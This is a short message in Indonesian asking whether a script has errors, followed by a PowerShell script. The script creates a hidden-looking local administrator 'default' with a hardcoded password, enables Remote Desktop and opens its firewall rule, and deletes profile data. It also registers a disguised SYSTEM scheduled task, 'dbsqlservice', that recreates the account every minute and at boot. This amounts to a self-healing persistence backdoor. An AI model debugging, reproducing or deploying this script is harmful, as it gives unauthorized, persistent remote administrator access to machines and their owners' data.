sudah saya lakukan, apakah ada yang eror

# ================= CONFIG =================
$Username = "default"
$PlainPassword = "Farel34153431!"
$TaskName = "dbsqlservice"
$LogFile = "C:\ProgramData\dbsql.log"
# ========================================

function Log($m){
    "$([DateTime]::Now) :: $m" | Out-File -Append $LogFile
}

function Fix-Profile {

    try {
        $sid = (Get-LocalUser $Username).SID.Value
        $profilePath = "C:\Users\$Username"

        if (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid") {
            Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid" -Recurse -Force
            Log "Profile registry nuked"
        }

        if (Test-Path $profilePath){
            Remove-Item $profilePath -Recurse -Force
            Log "Profile folder nuked"
        }
    } catch {}
}

function Ensure-User {

    $SecurePassword = ConvertTo-SecureString $PlainPassword -AsPlainText -Force

    if (-not (Get-LocalUser $Username -ErrorAction SilentlyContinue)) {

        New-LocalUser `
            -Name $Username `
            -Password $SecurePassword `
            -FullName "System Service Account" `
            -Description "Auto-created SYSTEM user" `
            -PasswordNeverExpires `
            -AccountNeverExpires

        Add-LocalGroupMember -SID "S-1-5-32-544" -Member $Username
        Add-LocalGroupMember -SID "S-1-5-32-555" -Member $Username

        Log "User recreated"
    }
Enable-LocalUser $Username -ErrorAction SilentlyContinue
cmd /c "net user $Username /active:yes"
Set-LocalUser $Username -Password $SecurePassword

$rdpKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"

if (!(Test-Path $rdpKey)) {
    New-Item -Path $rdpKey -Force | Out-Null
}

Set-ItemProperty $rdpKey -Name fDenyTSConnections -Value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue

Set-Service TermService -StartupType Automatic
Start-Service TermService -ErrorAction SilentlyContinue

    Log "User verified"
}

function Ensure-Rights {

    Add-LocalGroupMember -SID "S-1-5-32-555" -Member $Username -ErrorAction SilentlyContinue
    Log "RDP rights fixed"
}


function Ensure-Task {

    if (-not (Get-ScheduledTask $TaskName -ErrorAction SilentlyContinue)) {

        $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-ExecutionPolicy Bypass -File `"$PSCommandPath`""

        $boot = New-ScheduledTaskTrigger -AtStartup
        $loop = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)

        Register-ScheduledTask `
            -TaskName $TaskName `
            -Action $action `
            -Trigger @($boot,$loop) `
            -User SYSTEM `
            -RunLevel Highest `
            -Force | Out-Null

        Log "Task recreated"
    }
}

# ================= MAIN =================

Ensure-Task
Ensure-User
Ensure-Rights

# profile health check
if (-not (Test-Path "C:\Users\$Username")){
    Fix-Profile
}

Log "Heartbeat OK"


